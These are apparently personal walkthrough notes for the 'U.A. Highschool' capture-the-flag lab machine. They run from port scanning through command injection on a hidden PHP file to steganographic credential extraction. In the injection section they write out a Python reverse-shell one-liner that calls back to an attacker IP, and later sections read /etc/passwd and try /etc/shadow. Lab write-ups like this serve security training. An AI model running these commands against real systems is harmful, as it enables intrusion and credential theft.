# U.A. Highschool CTF

## Recon
1. nmap -sS -oN nmap_initial.txt gives us open ssh and http ports. Lets get detail on the http port 
2. nmap -A -p80 -oN nmap_http.txt school.thm we have an apache web server running lets go ahead and look at the website
3. The webiste has a few forms but non seem functional there doesn't seem to be anything interesting in the sorce code.
4. gobuster dir -u http://school.thm -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -t 50 reveals only /assets and /server-status
5. Wild goose chase with Japanese word lists
6. the hint says be suspicous of any unused files lets look for files; we find an index.php
7. we have found LFI on index.php

## LFI Exploration

1. http://school.thm/assets/index.php?cmd=whoami gives us d3d3LWRhdGEK
2. base 64 decode shows user is www-data
3. http://school.thm/assets/index.php?cmd=cat /etc/apache2/sites-enabled/000-default.conf reveals some info see apache_conf.txt
4. we are able to reverse shell http://school.thm/assets/index.php?cmd=python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.6.6.11",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"]);'


## Reverse Shell

1. stabalize with: python3 -c 'import pty; pty.spawn("/bin/bash")'
2. make terminal responsive export TERM=xterm
3. improve input handling: stty raw -echo; fg
4. www-data@myheroacademia:/var/www/html/assets$ whoami && hostname
www-data
myheroacademia
5. www-data@myheroacademia:/var/www/html/assets$ uname -a
Linux myheroacademia 5.4.0-153-generic #170-Ubuntu SMP Fri Jun 16 13:43:31 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux
6. www-data@myheroacademia:/var/www/html/assets$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
7. www-data@myheroacademia:/var/www/html/assets$ df -h
Filesystem                         Size  Used Avail Use% Mounted on
/dev/mapper/ubuntu--vg-ubuntu--lv  9.8G  4.7G  4.7G  51% /
udev                               436M     0  436M   0% /dev
tmpfs                              481M     0  481M   0% /dev/shm
tmpfs                               97M  944K   96M   1% /run
tmpfs                              5.0M     0  5.0M   0% /run/lock
tmpfs                              481M     0  481M   0% /sys/fs/cgroup
/dev/loop0                          64M   64M     0 100% /snap/core20/1828
/dev/loop1                          50M   50M     0 100% /snap/snapd/18357
/dev/loop2                          92M   92M     0 100% /snap/lxd/24061
/dev/xvda2                         1.7G  108M  1.5G   7% /boot
8. /usr/bin/passwd
/usr/bin/chsh
/usr/bin/gpasswd
/usr/bin/fusermount
/usr/bin/mount
/usr/bin/newgrp
/usr/bin/sudo
/usr/bin/chfn
/usr/bin/pkexec
/usr/bin/umount
/usr/bin/at
/usr/bin/su
/usr/lib/openssh/ssh-keysign
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/snapd/snap-confine
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device
/snap/core20/1828/usr/bin/chfn
/snap/core20/1828/usr/bin/chsh
/snap/core20/1828/usr/bin/gpasswd
/snap/core20/1828/usr/bin/mount
/snap/core20/1828/usr/bin/newgrp
/snap/core20/1828/usr/bin/passwd
/snap/core20/1828/usr/bin/su
/snap/core20/1828/usr/bin/sudo
/snap/core20/1828/usr/bin/umount
/snap/core20/1828/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core20/1828/usr/lib/openssh/ssh-keysign
/snap/snapd/18357/usr/lib/snapd/snap-confine
9. www-data@myheroacademia:/var/www/html/assets$ find / -writable -type f 2>/dev/null
cat /etc/passwd | grep bash/var/www/html/assets/images/yuei.jpg
/var/www/html/assets/images/oneforall.jpg
/var/www/html/assets/index.php
/var/www/html/index.html
/var/www/html/about.html
/var/www/html/admissions.html
/var/www/html/contact.html
/var/www/html/courses.html
/var/www/Hidden_Content/passphrase.txt
10. www-data@myheroacademia:/var/www/html/assets$ cat /var/www/Hidden_Content/passphrase.txt
QWxsbWlnaHRGb3JFdmVyISEhCg== : AllmightForEver!!!
11. www-data@myheroacademia:/var/www/html/assets$ cat /etc/passwd | cut -d: -f1
root
daemon
bin
sys
sync
games
man
lp
mail
news
uucp
proxy
www-data
backup
list
irc
gnats
nobody
systemd-network
systemd-resolve
systemd-timesync
messagebus
syslog
_apt
tss
uuidd
tcpdump
landscape
pollinate
fwupd-refresh
usbmux
sshd
systemd-coredump
deku

lxd

11. su - deku fail
12. ssh deku@school.thm fail
13. www-data@myheroacademia:/var/www/html/assets$ cat /etc/shadow | grep deku
cat: /etc/shadow: Permission denied
14. www-data@myheroacademia:/var/www/html/assets$ netstat -tulnp
ps aux | grep deku(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::80                   :::*                    LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -                   
udp        0      0 127.0.0.53:53           0.0.0.0:*                           -                   
udp        0      0 10.10.5.150:68          0.0.0.0:*                           -                   
udp        0      0 0.0.0.0:55490           0.0.0.0:*                           -                   
www-data@myheroacademia:/var/www/html/assets$ 
15. www-data@myheroacademia:/var/www/html/assets$ ls -la /home/deku/
total 36
drwxr-xr-x 5 deku deku 4096 Jul 10  2023 .
drwxr-xr-x 3 root root 4096 Jul  9  2023 ..
lrwxrwxrwx 1 root root    9 Jul  9  2023 .bash_history -> /dev/null
-rw-r--r-- 1 deku deku  220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 deku deku 3771 Feb 25  2020 .bashrc
drwx------ 2 deku deku 4096 Jul  9  2023 .cache
drwxrwxr-x 3 deku deku 4096 Jul  9  2023 .local
-rw-r--r-- 1 deku deku  807 Feb 25  2020 .profile
drwx------ 2 deku deku 4096 Jul  9  2023 .ssh
-rw-r--r-- 1 deku deku    0 Jul  9  2023 .sudo_as_admin_successful
-r-------- 1 deku deku   33 Jul 10  2023 user.txt
16 we found the flag but:
www-data@myheroacademia:/var/www/html/assets$ cat /home/deku/user.txt
cat: /home/deku/user.txt: Permission denied
17. ww-data@myheroacademia:/var/www/html/assets$ find / -perm -4000 -type f 2>/dev/null
/usr/bin/passwd
/usr/bin/chsh
/usr/bin/gpasswd
/usr/bin/fusermount
/usr/bin/mount
/usr/bin/newgrp
/usr/bin/sudo
/usr/bin/chfn
/usr/bin/pkexec
/usr/bin/umount
/usr/bin/at
/usr/bin/su
/usr/lib/openssh/ssh-keysign
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/snapd/snap-confine
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
18. looking back at the hint unused files : 
www-data@myheroacademia:/var/www/html/assets$ ls -la images/
total 336
drwxrwxr-x 2 www-data www-data   4096 Jul  9  2023 .
drwxrwxr-x 3 www-data www-data   4096 Jan 25  2024 ..
-rw-rw-r-- 1 www-data www-data  98264 Jul  9  2023 oneforall.jpg
-rw-rw-r-- 1 www-data www-data 237170 Jul  9  2023 yuei.jpg
oneforall.jpg isn't used on the site

## Image Examination

1. download image wget http://school.thm/assets/images/oneforall.jpg
2. exiftool oneforall.jpg > exif.txt it appears to be a .png file not .jpg
3. pngcheck -v oneforall.png
File: oneforall.png (98264 bytes)
  invalid chunk name "" (01 00 00 01)
ERRORS DETECTED in oneforall.png
4. file oneforall.png 
oneforall.png: data
5. hexedit to switch to jpg : 
file oneforall.jpg
oneforall.jpg: JPEG image data, JFIF standard 1.01, aspect ratio, density 1x1, segment length 16, baseline, precision 8, 1140x570, components 3
6. steghide extract -sf oneforall.jpg
Enter passphrase: AllmightForEver!!!
wrote extracted data to "creds.txt"
7. password found: One?For?All_!!one1/A
